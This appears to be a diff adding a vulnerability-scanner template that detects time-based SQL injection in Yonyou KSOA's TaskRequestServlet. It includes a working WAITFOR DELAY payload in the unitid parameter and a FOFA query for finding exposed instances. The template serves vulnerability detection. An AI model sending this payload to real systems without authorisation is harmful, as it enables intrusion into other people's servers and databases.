@@ -1,0 +1,27 @@
+id: NC-KSOA-TaskRequestServlet-sqli
+
+info:
+  name: NC KSOA TaskRequestServlet sql injection vulnerability(用友时空 KSOATaskRequestServlet sql注入漏洞)
+  author: linfeng7z
+  severity: critical
+  tags: nc,yongyou,ksoa,taskrequestservlet,sqli
+  metadata:
+    fofa-query: 'app="用友-时空KSOA"'
+
+http:
+  - raw:
+      - |
+        @timeout: 10s
+        GET /servlet/com.sksoft.v8.trans.servlet.TaskRequestServlet?unitid=1%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)
+        Accept-Encoding: gzip, deflate
+        Connection: clos
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration >= 5'
+          - "status_code_1 == 200"
+        condition: and
